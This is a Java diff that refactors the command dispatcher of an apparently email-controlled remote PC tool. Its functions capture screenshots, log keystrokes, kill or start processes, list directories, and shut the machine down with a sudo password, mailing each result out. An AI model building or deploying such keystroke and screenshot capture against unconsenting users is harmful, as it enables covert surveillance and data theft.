@@ -12,7 +12,7 @@ import java.util.regex.Pattern;
 
 public class Main {
     private static int takeScreenshot(){
-        String subject = "res" ;
+        String subject = "res/takeshot" ;
         try {
             SendMail.getInstance().Send(subject, "",ScreenShot.getInstance().takeScreenShot());
             return 1;
@@ -22,12 +22,10 @@ public class Main {
         }
     }
     private static int keyLog(long timer){
-        String filename = "KEY LOG" + ZonedDateTime.now().format(DateTimeFormatter
-                .ofPattern(" dd-MM-yyyy HH-mm")) + ".txt";
+
         try {
-            KeyLogger.getInstance().startLog(filename,timer);
-            String subject = "res/" ;
-            SendMail.getInstance().Send(subject,"", filename);
+            String subject = "res/keylog" ;
+            SendMail.getInstance().Send(subject,"", KeyLogger.getInstance().startLog(timer));
             return 1;
         } catch (IOException e) {
             System.out.println("Error log");
@@ -44,7 +42,7 @@ public class Main {
             LogoutandShut.getInstance().Logout(sudopass);
             return 1;
         }catch (Exception e){
-            String subject = "res / " ;
+            String subject = "res/shutdown" ;
             try {
                 SendMail.getInstance().Send(subject, "Can't Shutdown due to error: " + e.toString(), null);
             }catch (IOException | MessagingException er){
@@ -55,7 +53,7 @@ public class Main {
         }
     }
     private static int ListProcess(){
-        String subject = "res/";
+        String subject = "res/list process";
         try{
             SendMail.getInstance().Send(subject,"", ProcessPC.getInstance().ProcessList());
             return 1;
@@ -107,9 +105,8 @@ public class Main {
         }
     }
     private static int stopProcess(int PID){
-        String subject = "Kill " + PID + " successfully";
+        String subject = ProcessPC.getInstance().StopProcess(PID);
         try{
-            ProcessPC.getInstance().StopProcess(PID);
             SendMail.getInstance().Send(subject,"",null);
             return 1;
         }catch(IOException | MessagingException e){
@@ -118,9 +115,8 @@ public class Main {
         }
     }
     private static int startProcess(String Path){
-        String subject = "Start " + Path + " successfully";
+        String subject = ProcessPC.getInstance().StartProcess(Path);
         try{
-            ProcessPC.getInstance().StartProcess(Path);
             SendMail.getInstance().Send(subject,"",null);
             return 1;
         }catch(IOException | MessagingException e){
@@ -129,7 +125,7 @@ public class Main {
         }
     }
     private static int listDir(){
-        String subject = "res / " ;
+        String subject = "res/ " ;
         String filename = "List Directory" + ZonedDateTime.now().format(DateTimeFormatter
                 .ofPattern(" dd-MM-yyyy HH-mm")) + ".txt";
         try{
